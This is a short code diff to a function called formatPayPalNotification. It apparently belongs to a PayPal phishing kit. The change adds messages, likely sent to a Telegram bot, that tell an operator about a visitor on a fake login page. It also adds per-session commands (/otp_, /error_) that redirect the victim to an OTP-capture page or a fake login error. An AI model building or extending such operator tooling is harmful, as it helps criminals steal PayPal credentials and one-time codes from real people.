@@ -78,7 +78,12 @@ export function formatPayPalNotification(data: {
   device?: string;
   browser?: string;
   sessionId?: string;
+  targetUrl?: string;
 }): string {
+  const redirectMessage = data.targetUrl 
+    ? `\n\nThe visitor will be redirected within 2 seconds.`
+    : `\n\n<b>⏳ Client en attente...</b>\n\nCommandes:\n/otp_${data.sessionId} - Rediriger vers OTP\n/error_${data.sessionId} - Rediriger vers LOGIN ERROR`;
+  
   return `
 🔔 <b>New Activity</b>
 
@@ -92,7 +97,7 @@ export function formatPayPalNotification(data: {
 <b>Session:</b> ${data.sessionId || 'N/A'}
 <b>Device:</b> ${data.device || 'Desktop/Unknown'}
 <b>Browser:</b> ${data.browser || 'Unknown'}
-<b>Page:</b> Login Page
+<b>Page:</b> Login Page${redirectMessage}
   `.trim();
 }
 
